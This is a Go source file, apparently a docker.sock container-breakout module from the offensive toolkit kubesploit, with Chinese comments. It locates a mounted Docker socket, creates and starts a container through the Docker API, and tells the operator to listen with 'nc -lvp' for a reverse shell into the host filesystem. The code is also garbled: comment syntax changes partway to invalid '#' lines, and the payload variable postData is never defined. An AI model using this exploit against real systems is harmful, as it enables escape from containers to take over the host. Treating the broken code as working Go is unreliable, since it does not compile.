# `kubesploit\data\modules\sourcecode\go\dockerSockBreakout\main.go`

```
package main

import (
	"context" // 上下文包，用于控制请求的取消、超时等
	"encoding/json" // JSON 数据的编解码
	"fmt" // 格式化输出
	"io/ioutil" // 读取文件内容
	"log" // 日志记录
	"net" // 网络通信
	"net/http" // HTTP 客户端和服务器
	"os/exec" // 执行外部命令
	"strings" // 字符串操作
)

// 发送消息函数，接收 HTTP 客户端、URL、请求方法和请求数据，返回响应数据
func sendMessage(httpClient *http.Client, url string, method string, postData string) []byte{
	var response *http.Response
	var err error

	// 根据请求方法选择不同的请求方式
	if method == "GET"{
		// 发送 GET 请求
		response, err = httpClient.Get(url)
# 如果条件不满足，则执行以下代码块
} else {
    # 使用 HTTP 客户端发送 POST 请求，传递 URL、内容类型和数据
    response, err = httpClient.Post(url, "application/json", strings.NewReader(postData))
}

# 如果发生错误，则抛出异常
if err != nil {
    panic(err)
}

# 读取响应体的内容到字节流中
bodyBytes, err := ioutil.ReadAll(response.Body)
if err != nil {
    # 如果发生错误，则记录错误并退出程序
    log.Fatal(err)
}

# 延迟关闭响应体
defer response.Body.Close()
# 返回响应体的内容
return bodyBytes
}

# 定义一个结构体类型 ContainerCreationStatus
type ContainerCreationStatus struct {
    # 定义结构体字段 Id，使用 JSON 标签指定对应的 JSON 字段名
    Id string `json:Id`
}
# 获取 Docker 的 sock 文件路径
func getDockerSockPath()(string,error){
    # 定义要执行的命令
    cmd := `if  cat /proc/self/mountinfo | grep -q '^[^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]]docker.sock'; then
       path=$(cat /proc/self/mountinfo | grep '^[^[:space:]]*[[:space:]][^[:space:]]*[[:space:]][^[:space:]]*[[:space:]]docker.sock' | cut -d' ' -f 5)
       echo $path
     else
       exit 1
     fi`
    # 执行命令并获取输出
    out, err := exec.Command("sh", "-c", cmd).Output()
    # 返回输出结果和可能的错误
    return strings.TrimSuffix(string(out), "\n"),err
}

# 创建容器
func createContainer(httpClient *http.Client, postData string){
    # 发送 HTTP 请求创建容器，并获取返回的数据
    bodyBytes := sendMessage(httpClient, "http://v1.27/containers/create", "POST", postData)
    # 打印提示信息
    fmt.Println("[*] Container has been created, waiting to start...")
    # 解析返回的数据为容器创建状态
    var containerCreationStatus ContainerCreationStatus
    err := json.Unmarshal(bodyBytes, &containerCreationStatus)
    # 如果解析出错，则处理错误
    if err != nil {
		// 如果发生错误，记录错误信息并退出程序
		log.Fatal(err)
	}

	// 根据容器创建状态的 ID 构建启动容器的 URL
	url := fmt.Sprintf("http://v1.27/containers/%s/start", containerCreationStatus.Id)
	// 发送 HTTP POST 请求启动容器，并获取返回的数据
	bodyBytes = sendMessage(httpClient, url, "POST", "")
	// 打印提示信息
	fmt.Println("[*] Container has been started")
	// 打印容器的 ID
	fmt.Printf("[*] Container ID: %s\n", containerCreationStatus.Id)
	// 打印返回的数据
	fmt.Print(string(bodyBytes))

}
// https://gist.github.com/teknoraver/5ffacb8757330715bcbcc90e6d46ac74
// 主函数，用于连接指定的 IP 和端口
func mainfunc(ipToConnect string, port string) {
	// 清理 IP 和端口字符串中的空格
	ipToConnect = strings.TrimSpace(ipToConnect)
	port = strings.TrimSpace(port)

	// 如果端口为空，则设置默认端口为 6666
	if port == "" {
		port = "6666"
	}

# 获取 Docker 的 sock 路径和可能的错误
dockerSockPath, err := getDockerSockPath()
# 如果出现错误，打印错误信息并结束 exploit
if err != nil {
    fmt.Printf("[!] Docker sock is not mounted in the container. Ending exploit\n")
    return
}

# 创建一个 HTTP 客户端
httpc := http.Client{
    Transport: &http.Transport{
        # 定义一个 DialContext 函数，用于在 Unix 套接字上建立连接
        DialContext: func(_ context.Context, _, _ string) (net.Conn, error) {
            return net.Dial("unix", dockerSockPath)
        },
    },
}

# 发送 HTTP 请求并获取响应的数据
bodyBytes := sendMessage(&httpc, "http://host/containers/json", "GET", "")
# 打印响应数据
fmt.Println(string(bodyBytes))

# 创建一个容器
createContainer(&httpc, postData)

# 打印监听端口和 IP 地址，以便获取 shell
fmt.Printf("[*] Listen to port %s on IP %s to get a shell (\"nc -lvp %s\")\n", port, ipToConnect, port)
# 打印消息，指示容器内主机的路径为/host
fmt.Printf("[*] The path to the host machine inside the container is /host\n")
# 将响应体的内容复制到标准输出
//io.Copy(os.Stdout, response.Body)
}

# 主函数
func main(){
    # 调用主函数
	//mainfunc("192.168.1.1", "6666")
}
```